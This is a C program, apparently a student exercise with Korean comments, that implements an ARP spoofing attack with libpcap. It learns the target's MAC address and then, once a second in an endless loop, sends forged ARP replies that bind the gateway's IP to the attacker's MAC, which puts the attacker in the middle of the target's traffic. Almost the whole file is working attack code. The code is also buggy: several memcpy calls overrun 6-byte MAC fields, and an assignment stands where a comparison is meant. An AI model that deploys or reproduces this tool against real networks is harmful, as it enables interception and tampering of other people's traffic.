#include <sys/time.h>
#include <netinet/in.h>
#include <pcap/pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/rtnetlink.h>
#include <arpa/inet.h>
#include "networkinfo.h"

int callback(const u_char *packet, u_char *t_mac, char* t_ip);

int main(int argc, char **argv){
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    int ret;
    struct pcap_pkthdr hdr;
    struct in_addr net_addr, mask_addr;
    struct ether_header *eptr;
    const u_char *packet;
    u_char *cp;
    u_char sp_buf[1024];
    u_char t_ip[16], s_ip[16], g_ip[16], t_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff}, s_mac[6];

    struct bpf_program fp;

    pcap_t *pcd;  // packet capture descriptor

    dev = pcap_lookupdev(errbuf); // 디바이스 이름
    if (dev == NULL)    {
        printf("%s\n", errbuf);
        exit(1);
    }

    pcd = pcap_open_live(dev, BUFSIZ,  1, 1000, errbuf);
    if (pcd == NULL){
        printf("%s\n", errbuf);
        exit(1);
    }
    printf("Target IP Adress: ");
    scanf("%s", t_ip);
    getMIPAddress(dev, s_ip);
    getMMACAddress(dev, s_mac);
    getGIPAddress(dev, g_ip);
    printf("Source IP Adress: %s\n", s_ip);
    printf("Gateway IP Adress: %s\n", g_ip);

    struct ether_header etheh;

    cp = sp_buf;
    memcpy(etheh.ether_dhost, t_mac, 12);
    memcpy(etheh.ether_shost, s_mac, 12);
    etheh.ether_type = htons(ETHERTYPE_ARP);
    memcpy(cp, &etheh, sizeof(struct ether_header));
    cp += sizeof(struct ether_header);

    struct ether_arp arph;
    memcpy(arph.arp_sha, s_mac, 12);
    inet_aton(s_ip, &(arph.arp_spa));
    memcpy(arph.arp_tha, t_mac, 12);
    inet_aton(t_ip, &(arph.arp_tpa));
    arph.ea_hdr.ar_hln = 6;
    arph.ea_hdr.ar_hrd = htons(1);
    arph.ea_hdr.ar_pln = 4;
    arph.ea_hdr.ar_pro = htons(0x0800);
    arph.ea_hdr.ar_op = htons(1);
    memcpy(cp, &arph, sizeof(struct ether_arp)); //arp 패킷 세팅

    if((pcap_inject(pcd,sp_buf,sizeof(struct ether_header)+sizeof(struct ether_arp))) ==-1) {
        pcap_perror(pcd,0);
        pcap_close(pcd);
        exit(1);
    };


    // 패킷이 캡쳐되면 callback함수를 실행한다.
    while(1){

        packet = pcap_next(pcd, &hdr);
        if(callback(packet, t_mac, t_ip) == 1)
            break;
    }
    printf("Source MAC Address: ");
    for(int i=0; i<5; i++)
        printf("%2x:", s_mac[i]);
    printf("%2x\n", s_mac[5]);
    printf("Target MAC Address: ");
    for(int i=0; i<5; i++)
        printf("%2x:", t_mac[i]);
    printf("%2x\n", t_mac[5]);

    printf("Attack start\n"); //타겟에 게이트웨이 ip와 자신의 mac을 담은 arp reply패킷을 전송한다
    inet_aton(g_ip, &(arph.arp_spa));
    arph.ea_hdr.ar_op = htons(2);

    cp = sp_buf;
    cp += sizeof(struct ether_header);
    memcpy(cp, &arph, sizeof(struct ether_arp)); //arp 패킷 세팅

    while(1){
        printf("send arp reply packet\n");
        if((pcap_inject(pcd,sp_buf,sizeof(struct ether_header)+sizeof(struct ether_arp))) ==-1) {
            pcap_perror(pcd,0);
            pcap_close(pcd);
            exit(1);
        };
        sleep(1);
    }
    return 0;
}
int callback(const u_char *packet, u_char * t_mac, char* t_ip){
    struct ether_header *etheh; // Ethernet 헤더 구조체
    unsigned short ether_type;

    // 이더넷 헤더를 가져온다.
    etheh = (struct ether_header *)packet;
    packet += sizeof(struct ether_header);
    // 네트워크 패킷은 big redian 이라서 little redian형식으로 바꿔준다.
    ether_type = ntohs(etheh->ether_type);

    if (ether_type == ETHERTYPE_ARP){
        struct ether_arp *arph; // arp 헤더 구조체
        arph = (struct ether_arp *)packet;
        packet += sizeof(struct ether_arp);
        if(arph->ea_hdr.ar_op = 2){
            char tip[16];
            inet_ntop(AF_INET, &arph->arp_spa, tip, sizeof(tip));
            if(!strcmp(tip, t_ip)){
                memcpy(t_mac, arph->arp_sha, 12);
                return 1;
            }
        }
    }
    return 0;
}
